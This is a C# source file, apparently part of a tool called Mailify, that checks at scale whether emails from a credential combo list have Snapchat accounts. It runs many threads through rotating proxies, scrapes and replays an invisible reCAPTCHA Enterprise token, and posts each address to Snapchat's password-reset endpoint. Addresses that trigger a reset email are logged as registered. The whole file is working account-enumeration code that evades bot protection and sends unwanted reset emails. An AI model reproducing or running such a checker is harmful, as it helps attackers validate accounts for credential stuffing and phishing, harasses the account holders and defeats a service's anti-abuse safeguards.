using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class Snapchat_VM
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;


            new Thread(() => Variables.VM_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();

            Thread.Sleep(-1);

        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));


                    var res0 = req.Get("https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LezjdAZAAAAAD1FaW81QpkkplPNzCNnIOU5anHw&co=aHR0cHM6Ly9hY2NvdW50cy5zbmFwY2hhdC5jb206NDQz&hl=en&v=T9w1ROdplctW2nVKvNJYXH8o&size=invisible&badge=inline&cb=fdz7fsng5qkm");
                    string text0 = res0.ToString();

                    var token = Functions.LR(text0, "<input type=\"hidden\" id=\"recaptcha-token\" value=\"", "\">").FirstOrDefault();

                    var res1 = req.Post("https://www.google.com/recaptcha/enterprise/reload?k=6LezjdAZAAAAAD1FaW81QpkkplPNzCNnIOU5anHw", "v=T9w1ROdplctW2nVKvNJYXH8o&reason=q&c=" + token + "&k=6LezjdAZAAAAAD1FaW81QpkkplPNzCNnIOU5anHw&co=aHR0cHM6Ly9hY2NvdW50cy5zbmFwY2hhdC5jb206NDQz&hl=en&size=invisible&chr=%5B96%2C10%2C74%5D%22&vh=-17302517492&bg=!j4mgiaDIAAWoGLRLqEc8VEkdHbArfV2UJEQRIYLsCQcAAAE4VwAAACCcCenSgCz554HJdd_dwHoiDTxV8O6QgPP3pl4LmqfftCtTENNQoTmBqEXMc-k5uPSX50fmvFqghofq-0Ltte0OMyIgPkrtkmtsHMcZPjPrAB5XNPu8873HXE7Tycf_YgDXn0lUG6ZMbsxftGGyam5zPuHWdmIjBnhpMLTfdYuO4YhL6IIoJoArKF6D2zzOCm-x4k6vB7UuPAJyU7IsqWHCrMBV_tqrCFgarT-8GkYmwpEMRHZj98oqrfyv9QeYSN76YgYXw9qQEK-dGAse6hIdX8jylF8rXKiKLQzBHXZns10cpjm2H1rTX_IkJ1SiszKpn5YiDGeSJsSbG4Lgxss7ODk0r1nod6dLC4GyBGi87CnFeJV6Nyzt0x2_q7O8xyje9LQ1wYtygQ8WudqkvbeYomg9R2ABmBZDbygPLPmfi1LE-sGuMWPA8eRvylDLanxWg7e4rP08nEIjcTMsJ9IuzaJM3WasSHof0qbq-kQgGCLf7YugSZr70nj5OuEmkg4NjXTczZAZF2bXiRBvEWc-WMjD08Rtu3W31GWnTTG4463kZM0QOj6WvwD3NHM3JjZfFMaee-0i23T8JGpDPvWxafDuJYbfETS2PxWaaPF7jImMGjkkW7o0uP-WyYcCkydiJwgZb8yF3SSom773rARhphBeB2yFuY8gQlgid8ahxGkCbr52leTUkKlYLFZR1ldnsgxFTkRrmDw39aTAkCxnsY6MhjOmxrN9BpwieoAQXrkTJmUYIJnDfx1PzT6KK0wq1dsAc3gzrHlEttrcXDeNUe6tZFA3xNkY9IWZ_Y-w_dxg9AmjnBfJcqDW-iJwdLzPxt4DkjF3GNPBqvMf6eCQ4h0mOsEyUlPaECxjFmzaYZbka15KTUFSj9FgPF13wZV9OffPSSve0YxJ2FkIilY6gg9bEsvoQa51sEbytLhPYgbNxuugoprg8AkG0q_C9JZn-cfLD1CtDVkjSRdb387_RrDJPocyJV8I6OO7V_tcME3N_lkHDg6wVYj9bCPD9add5TVoH9kWsyfu-_O42V9oOYHIt0-LWFNGRBmxkP81tGM5kdBo3mqJbJCIcdCT3n_VVWzitJe4KPl6lGdNxwHY7EB9KPneyntH2Saap6Iq3pp6dMLUmle8IoKtdvDNaufC-LoVQYN4CaHTIeE8GPmQUYPH28L30nzfx-zrXrv89bKBkpEBrDZiYixN1W_NlzhHLSa02gRaDsrctdy43O4VeKO5vmMqjTZ6lzX0hV64rweKS6zAbjtWlg7F3TeLMfyNHi7CUp4yHfPOXJ40q81zgdXqY3huaxHQFM2uC7mgl8zRYLBCox0ogBmP1YtuYJpE3yl-w_RDLKQ-ONiCotm_im-z0vRGxiYdKA93TFqjFi9FV32Xz_yV7xq4D0RqHAucCmtFWouEACXiY-wcn37yclcL1ecADsJFV_e73iLfRySSrs-WmViTLk74NY_MF-q0Rspt1eKZPUupfwCiCJMpxbHhl1uRG9aBiMbB8Ms3A7GLatDk4OJ_0TSID3M33iniinss0xeNl-qEMeiax1bbDzy1ptyfH0n5JRdD282GrbD9lFXxDqljCexiB--Gv6EURJAKtdjYCq3tMiaIRMkM1xIdQawYJhOrHWPa0X_3tha595g5N7hYplnXHrd8PnFPkrzW5CDC9_mEpQLfUzvXGFP7QT-pf_KSpnWZI04idSXgGjkk-Yhd02p-S14NiK0OEC-eHo4ruwKDQav5iQbDRvwo8KJJlLI0F1rLtW-g_MI27KA2O95r2EiW_7EDiwB_BK1s4czdYnA9y7z9--qIeED-EfuQfFMO0uweIDd7O1IjwqilOOBMKJtsMXKwZm1vbJw20kcNZAomlyEHmvzHy4VAmwL0icQDs-u3ZwiLKxNgOxIf1aLk-eR0PncO-laSkGSTrf9yHXacghnn4Mn1K5nE6yqEqREIo4qxd_C0b8FxMz96Mo3VcN-0_VLMLw08qv_YynT0GgGHGjvOFx7R53d6YsWjykN6_DiSx8QUXa9q2o3NUgkb10vh038Fn4EpO7a1MFG7g14ne6251_xoGopOasnVtw8DYSDaDJdGHjjk_NVdlFOHHwN5d66_8bQn05gUnhAi1JzZCC9YXky9xqyEdfcgs-LE0CzNuA-KwKs7gR7LclAsAfaJo-ARtgdDlAyMrX2JF9Sjqu3CSC4l0cPc0gkhOS24yofwUqEeL1JBwUHn3cC8ke0xOeD7wk40kMnsEQN-VaCM5-wxs2VQt8-wClEd-3RX30fsPOVS7ZzdCAjsJQidPufZVj7gGGGlqRWZLfxf6G6NMK_5PoEWN2bG1byFZo6-NT6szNeqW3Nz0Swf-tFHsfr3TDb5LaxfuAXucRn2IQ6bjABdRR5lq4hdYNj2KYfq6qMb21pOHcNYrY185DSPOrMwsq71hg9b-XXSLwDVHj0jBFdtB_N9M1hc9q_bRTQw9aQvg_M2LtgQeKS77rTcsxYL0FUHEkOEDKHCaTuVFhshhPN3enFu97d6pyN41fr_QKzgmjkYqsx1SgAq8dQ8cCa63U7e9FOh3riKyAkW7_NuQss1vhJ4UJ8BBzot2JJSfLCjorUDJgri2dI3I3FIaLKPiu17Lc3FZmV0VX-S66L4NRsRnmrZFMBH6-ou8BCQDYh0BD41NjhIIPKqOdx0mPmI1UMGZlg8-UQP08wUqxha9Sg34AH0EmZUszfDXpFwgChLv5wvzcxaN6YSTjekWCLRWPTW7B6xg3h0NnCNsJ8lVp88jKVF9MEtgRTPwFH1aWUHD6p6GYI2iogNrVf7RdzK24I7tJjqRNCuBbYAB1FfLgKZGzc6pREo9PiLQFXi_l4C6CJtsZOHKWlMNMmzH3hrTwmYowvdZ023uUOJzBPgHJeodjBqo0EiHJOAs_mGw90mB6DGa6ELGUAL5snewusDDXtw1G7C_bhsUXMJ1pY40vUSINAiG5PcPkLcfBQHqvaaiY06hUjDoHMmMbjkXACkcm7wdcIXwI6iS0RtrGULUBX3OvLzrU2LHVqQYmGwXv9N-R7H-lmBxK1Iac5TLqi8ysIT8HfiOmn-CK0dmPIoZedjAOQe-92nG2MXjqMNTNGwCNipT6NbaN1p01r0eTFAmYS2OVrldwG_6ZyuitVKtncORLc5dNphQc9qixTEJPZhNUt3tcRkyBmPBE1VDCdaSYZMdr6JJtmbN512vgy4vXSCoDzC6DjPsqkZc1MGxYveAtih8fodSAKr-SgLgPpLq5jlDomz90QRqLDPIgr719zndszNoWCAgNu2gYHwqI1GZ1h3JdcDSCoC5ecFJMbMypl9rnj4K4RdGi7Ri1vmKsFesovmpwpnn8XC3HJx9xmk7oXlTVl7uMVVZ_LhurV1bQ*", "application/x-www-form-urlencoded");
                    string text1 = res1.ToString();

                    var rresp = Functions.LR(text1, "[\"rresp\",\"", "\",").FirstOrDefault();

                    req.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36");
                    req.AddHeader("Pragma", "no-cache");
                    req.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8");

                    var res2 = req.Get("https://accounts.snapchat.com/accounts/password_reset_request");
                    string text2 = res2.ToString();

                    var TOKEN = Functions.LR(text2, "xsrf=\"", "\"").FirstOrDefault();



                    var res3 = req.Post("https://accounts.snapchat.com/accounts/password_reset_request", "emailaddress=" +credentials[0] + "&xsrf_token=" + TOKEN + "&g-recaptcha-response=" + rresp + "&g-recaptcha-response=" + rresp + "", "application/x-www-form-urlencoded");
                    string text3 = res3.ToString();

                    if (text3.Contains("Email Sent &bull; Snapchat"))
                    {
                        Variables.Valid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            if (Config.kekr_UI == "LOG")
                            {
                                Console.WriteLine($"[+] {combo}", Color.Green);
                            }
                            File.AppendAllText(Variables.results + "Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else if (text3.Contains("Email address is invalid."))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                            File.AppendAllText(Variables.results + "Not Registered.txt", combo + Environment.NewLine);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }

                }

            }
            catch
            {

                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}